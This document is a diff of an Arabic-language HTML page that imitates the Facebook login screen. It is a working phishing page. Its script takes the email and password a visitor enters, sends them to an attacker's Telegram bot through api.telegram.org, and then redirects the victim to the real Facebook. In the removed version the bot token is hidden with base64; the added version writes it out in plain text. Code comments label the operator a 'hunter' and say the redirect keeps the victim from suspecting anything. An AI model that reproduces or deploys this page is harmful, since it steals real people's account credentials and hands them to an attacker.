@@ -1,37 +1,61 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In</title>
+    <title>Facebook - Log In or Sign Up</title>
     <style>
-        body { background-color: #f0f2f5; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .box { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 90%; max-width: 390px; text-align: center; }
-        .logo { color: #1877f2; font-size: 45px; font-weight: bold; margin-bottom: 15px; }
-        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; cursor: pointer; }
-        .link { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); width: 100%; max-width: 400px; text-align: center; }
+        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        button { width: 95%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .footer { margin-top: 20px; font-size: 14px; color: #606770; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="logo">facebook</div>
-        <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الهاتف">
-        <input type="password" id="p" placeholder="كلمة السر">
-        <button class="btn" onclick="s()">تسجيل الدخول</button>
-        <a href="#" class="link">هل نسيت كلمة السر؟</a>
-    </div>
-    <script>
-        function s() {
-            const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            const id = new URLSearchParams(window.location.search).get('id');
-            if(u.length > 4 && p.length > 4 && id) {
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent("🔵 **فيسبوك جديد**\n👤: `"+u+"`\n🔑: `"+p+"` ")}&parse_mode=Markdown`)
-                .then(() => { window.location.href = "https://m.facebook.com/login/save-device/"; });
-            }
+
+<div class="login-container">
+    <h1>facebook</h1>
+    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+    <input type="password" id="pass" placeholder="كلمة السر" required>
+    <button onclick="sendToBot()">تسجيل الدخول</button>
+    <div class="footer">هل نسيت كلمة السر؟ · مركز المساعدة</div>
+</div>
+
+<script>
+    async function sendToBot() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const chat_id = urlParams.get('id'); // ID الشخص اللي فتح البوت
+        const hunter = urlParams.get('hunter') || "غير معروف"; // اسم اليوزر (الصياد)
+
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        if (!email || !pass) { alert("خطأ في تسجيل الدخول"); return; }
+
+        const botToken = "8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE";
+        const message = `
+🔥 تم صيد حساب فيسبوك جديد!
+👤 اسم الصياد: ${hunter}
+📧 الإيميل: ${email}
+🔑 الباسورد: ${pass}
+🎯 النوع: Facebook Login
+        `;
+
+        try {
+            // إرسال البيانات للتيليجرام
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
+            
+            // تحويل الضحية لفيسبوك الحقيقي عشان ما يشك
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com";
+            }, 500);
+        } catch (e) {
+            window.location.href = "https://www.facebook.com";
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
